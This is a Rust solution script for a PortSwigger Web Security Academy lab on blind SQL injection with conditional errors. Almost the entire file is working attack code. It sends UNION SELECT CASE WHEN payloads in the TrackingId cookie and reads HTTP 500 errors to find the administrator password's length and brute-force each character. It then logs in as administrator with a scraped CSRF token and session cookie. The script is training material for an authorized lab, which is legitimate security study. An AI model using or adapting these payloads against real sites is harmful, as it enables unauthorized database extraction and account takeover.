/***************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 23/9/2023
*
* Lab: Blind SQL injection with conditional errors
*
* Steps: 1. Inject payload into 'TrackingId' cookie to determine the length of
*           administrator's password based on conditional errors
*        2. Modify the payload to brute force the administrator's password
*        3. Fetch the login page
*        4. Extract the csrf token and session cookie
*        5. Login as the administrator
*        6. Fetch the administrator profile
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0aab005b04215740848c3c9b00680008.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "[#] Injection point:".blue(),
        "TrackingId".yellow(),
    );

    // determine password length
    let password_length = determine_password_length(&client, url);

    // brute force password
    let admin_password = brute_force_password(&client, url, password_length);

    print!("\n{}", "3. Fetching login page.. ".white());
    io::stdout().flush();

    // fetch the login page
    let fetch_login = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "4. Extracting the csrf token and session cookie.. ".white()
    );
    io::stdout().flush();

    // extract session cookie
    let session = extract_session_multiple_cookies(fetch_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract the csrf token
    let csrf =
        extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract the csrf token".red()));

    println!("{}", "OK".green());
    print!("{}", "5. Logging in as the administrator.. ".white(),);
    io::stdout().flush();

    // login as the administrator
    let admin_login = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &admin_password),
            ("csrf", &csrf),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to login as the administrator".red()
        ));

    println!("{}", "OK".green());

    // extract the new session
    let new_session = extract_session_cookie(admin_login.headers()).expect(&format!(
        "{}",
        "[!] Failed to extract new session cookie".red()
    ));

    // fetch administrator page
    print!("{}", "6. Fetching the administrator profile.. ".white(),);
    io::stdout().flush();
    let admin = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={new_session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch administrator profile".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 The lab should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from multiple cookies
***********************************************************/
fn extract_session_multiple_cookies(headers: &HeaderMap) -> Option<String> {
    let cookie = headers
        .get_all("set-cookie")
        .iter()
        .nth(1)
        .unwrap()
        .to_str()
        .unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.find(text) {
        Some(text.as_str().to_string())
    } else {
        None
    }
}

/*******************************************
* Function to determine password length
********************************************/
fn determine_password_length(client: &Client, url: &str) -> usize {
    // variable that will hold the correct length
    let mut length = 0;

    for i in 1..50 {
        print!(
            "\r{} {}",
            "1. Checking if password length =".white(),
            i.to_string().yellow()
        );
        io::stdout().flush();

        // payload to determine password length
        let payload = format!(
            "' UNION SELECT CASE WHEN (length((select password from users where username = 'administrator')) = {}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -",
            i
        );

        // fetch the page with the injected payload
        let injection = client
            .get(format!("{url}/filter?category=Pets"))
            .header("Cookie", format!("TrackingId={payload}"))
            .send()
            .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload to determine password length"
                    .red()
            ));

        // if an internal server error occurred
        if injection.status().as_u16() == 500 {
            println!(
                " [ {} {} ]",
                "Correct length:".white(),
                i.to_string().green().bold()
            );

            // correct length
            length = i;

            break;
        } else {
            continue;
        }
    }

    // return the correct length
    length
}

/************************************
* Function to brute force password
*************************************/
fn brute_force_password(client: &Client, url: &str, password_length: usize) -> String {
    // variable that will hold the correct password
    let mut correct_password = String::new();

    for position in 1..=password_length {
        // iterate over possible chars
        for character in "0123456789abcdefghijklmnopqrstuvwxyz".chars() {
            print!(
                "\r{} {} {} {}",
                "2. Checking if char at position".white(),
                position.to_string().blue(),
                " = ".white(),
                character.to_string().yellow()
            );
            io::stdout().flush();

            // payload to brute force password
            let payload = format!(
                "' UNION SELECT CASE WHEN (substr((select password from users where username = 'administrator'), {}, 1) = '{}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -",
                position,
                character
            );

            // fetch the page with the injected payload
            let injection = client
                .get(format!("{url}/filter?category=Pets"))
                .header("Cookie", format!("TrackingId={payload}"))
                .send()
                .expect(&format!(
                "{}",
                "[!] Failed to fetch the page with the injected payload to brute force password"
                    .red()
            ));

            // if an internal server error occurred
            if injection.status().as_u16() == 500 {
                // update the correct password
                correct_password.push(character);

                print!(
                    " [ {} {} ]",
                    "Correct password:".white(),
                    correct_password.green().bold()
                );

                break;
            } else {
                continue;
            }
        }
    }

    // return the correct password
    correct_password
}
